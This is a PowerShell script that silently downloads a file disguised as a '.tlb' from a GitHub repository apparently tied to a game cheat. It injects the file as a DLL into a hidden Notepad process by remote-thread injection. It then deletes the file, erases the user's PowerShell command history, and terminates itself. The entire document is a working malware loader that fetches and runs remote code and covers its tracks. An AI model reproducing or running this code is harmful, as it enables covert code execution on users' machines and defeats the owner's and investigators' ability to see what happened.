# === Constants ===
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"

# === Win32 API declarations ===
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

function Inject-Silently {
    try {
        # 1. Launch Notepad hidden
        $newProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Milliseconds 500

        # 2. Download DLL
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop

        # 3. Open Process
        $targetPid = $newProcess.Id
        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPid)
        if ($hProcess -eq [IntPtr]::Zero) { return }

        # 4. Allocate memory and write DLL path
        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
        if ($allocMem -eq [IntPtr]::Zero) { return }

        $written = [IntPtr]::Zero
        $wrote = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$written)
        if (-not $wrote) { return }

        # 5. Get LoadLibraryA address
        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
        if ($loadLibraryAddr -eq [IntPtr]::Zero) { return }

        # 6. Inject DLL
        $threadId = [IntPtr]::Zero
        [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null

        # 7. Wait
        Start-Sleep -Seconds 2

        # 8. Delete DLL silently
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue

        # 9. Clear PowerShell command history
        $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $historyPath) {
            Set-Content -Path $historyPath -Value ""
        }

        # 10. Kill itself
        Stop-Process -Id $PID -Force
    } catch {
        # Failsafe cleanup
        Stop-Process -Id $PID -Force
    }
}

Inject-Silently
